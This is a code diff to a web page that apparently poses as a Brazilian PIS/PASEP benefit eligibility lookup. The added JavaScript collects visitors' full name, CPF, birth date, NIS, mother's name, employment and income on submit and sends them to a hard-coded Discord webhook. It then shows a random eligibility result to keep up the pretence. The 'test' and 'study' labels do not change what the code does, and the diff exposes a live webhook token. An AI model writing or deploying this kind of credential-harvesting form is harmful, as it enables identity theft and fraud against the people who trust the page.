@@ -629,19 +629,63 @@
             consultarBtn.disabled = !allValid;
         }
         
-        // Processamento do formulário
+        // Processamento do formulário MODIFICADO para enviar ao webhook
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Simular consulta ao sistema
-            setTimeout(() => {
-                const resultado = Math.random() > 0.3; // 70% de chance de ter direito
-                showResult(resultado);
-            }, 1000);
-            
+            // Coletar dados do formulário
+            const formData = {
+                nome: document.getElementById('nome_completo').value,
+                cpf: document.getElementById('cpf').value,
+                data_nascimento: document.getElementById('data_nascimento').value,
+                nis: document.getElementById('nis').value,
+                nome_mae: document.getElementById('nome_mae').value,
+                tempo_contribuicao: document.getElementById('tempo_contribuicao').value,
+                ultimo_emprego: document.getElementById('ultimo_emprego').value,
+                renda: document.getElementById('renda').value
+            };
+
             // Mostrar loading
             consultarBtn.disabled = true;
             consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+
+            // Enviar para webhook do Discord
+            fetch('https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: '🚀 **Nova consulta PIS/PASEP (TESTE)**',
+                    embeds: [{
+                        title: '📋 Dados do Formulário (Fictício)',
+                        description: 'Dados enviados para fins de estudo:',
+                        color: 0x3498db,
+                        fields: [
+                            { name: '👤 Nome', value: formData.nome || 'Não informado', inline: true },
+                            { name: '🆔 CPF', value: formData.cpf || 'Não informado', inline: true },
+                            { name: '📅 Data Nasc.', value: formData.data_nascimento || 'Não informado', inline: true },
+                            { name: '🔢 NIS', value: formData.nis || 'Não informado', inline: true },
+                            { name: '👩 Nome da Mãe', value: formData.nome_mae || 'Não informado', inline: true },
+                            { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? `${formData.tempo_contribuicao} anos` : 'Não informado', inline: true },
+                            { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
+                            { name: '💰 Renda', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            })
+            .then(() => {
+                // Simular resultado da consulta (70% de chance de ter direito)
+                const resultado = Math.random() > 0.3;
+                showResult(resultado);
+            })
+            .catch(error => {
+                console.error('Erro ao enviar para webhook:', error);
+                // Mostrar resultado mesmo se falhar o webhook
+                const resultado = Math.random() > 0.3;
+                showResult(resultado);
+            });
         });
         
         function showResult(hasRight) {
